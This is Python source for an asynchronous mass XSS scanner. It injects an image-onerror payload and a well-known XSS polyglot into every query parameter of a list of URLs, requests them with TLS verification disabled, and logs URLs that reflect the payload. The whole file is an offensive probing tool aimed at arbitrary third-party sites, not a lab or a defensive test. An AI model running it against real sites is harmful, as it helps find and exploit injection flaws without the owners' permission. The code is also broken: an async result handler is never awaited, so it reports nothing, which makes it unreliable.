import time
import aiohttp
import asyncio
import furl
from colorama import Fore
import urllib.parse

class MassScanner:
    def __init__(self, file, output , concurrency, timeout, redactDomains=False):
        self.file = file
        self.output = output
        self.queue = []
        self.payload =  '"><img//////src=x oNlY=1 oNerror=alert(1)//'
        self.encoded_payload = urllib.parse.quote(self.payload.replace(" ", "+") , safe="+" )
        self.polygot_payload =  urllib.parse.quote(""""jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )////</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e""") # Thanks to @0xsobky - https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
        self.concurrency = concurrency
        self.timeout = timeout
        self.redactDomains = redactDomains
        self.pending = []
        self.total_found = 0
        self.total_scanned = 0
        self.t0 = time.time()
    
    def redactURL(self, url):
        furl_obj = furl.furl(url)
        furl_obj.host = "REDACTED"
        return furl_obj.url 
 
    def createURLs(self, url): # This function creates all possible URL combinations by injecting the payload to each query parameter. Returns a list of URLs.
        url_combinations = []

        furl_obj = furl.furl(url)
        query_string = furl_obj.args

        for key in query_string:
            furl_obj_copy = furl_obj.copy()
            furl_obj_copy.args[key] = self.payload
            url_combinations.append(furl_obj_copy.url)
        
        return url_combinations
    
    def save_vulnerable_url(self, url):
        with open(self.output, "a") as f:
            f.write(url + "\n")

    async def fetch(self, session:aiohttp.ClientSession, url:str):
        try:
            async with session.get(url,allow_redirects=True,timeout=self.timeout)  as resp:
                return (await resp.text() ,   url)
        except:
            return ("", url)
        
    async def process_task(self,task):
        self.total_scanned += 1
        response_text , url  = task.result()
        url = url.replace(self.encoded_payload, self.polygot_payload )
        if self.payload in response_text:
            self.save_vulnerable_url(url)
            self.total_found +=1
            print(f"{Fore.RED} [+] Vulnerable parameter found: {Fore.WHITE} {(self.redactURL(url) if self.redactDomains else url)}")

    async def scan(self):
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False)) as session:
            urlsFile = open(self.file, "r")
            line = urlsFile.readline()

            while line: 
                # create new tasks until the concurrency limit is reached
                while len(self.pending) < self.concurrency: 
                    if self.queue:
                        self.pending.append(asyncio.create_task(self.fetch(session, self.queue.pop(0))) )
                    else:
                        payload_urls = self.createURLs(line.strip())
                        for payload_url in payload_urls:
                            if len(self.pending) < self.concurrency:
                                self.pending.append(asyncio.create_task(self.fetch(session, payload_url)))
                            else:
                                self.queue.append(payload_url)
                        line = urlsFile.readline()

                # wait for at least one task to be completed        
                done, self.pending = await asyncio.wait(self.pending, return_when=asyncio.FIRST_COMPLETED)
                self.pending = list(self.pending)

                # process the completed tasks
                for task in done:
                    self.process_task(task)

            urlsFile.close()

    def run(self):

        print(f"{Fore.YELLOW} [i] Starting scan with {self.concurrency} concurrency")
        print(f"{Fore.YELLOW} [i] Output file: {self.output}")
        print(f"{Fore.YELLOW} [i] Timeout: {self.timeout} seconds")

        asyncio.run(self.scan())
        
        print(f"{Fore.YELLOW} [i] Scanning finished. All URLs are saved to {self.output}")
        print(f"{Fore.YELLOW} [i] Total found: {self.total_found}")
        print(f"{Fore.YELLOW} [i] Total scanned: {self.total_scanned}")
        print(f"{Fore.YELLOW} [i] Time taken: {int(time.time() - self.t0)} seconds")
        
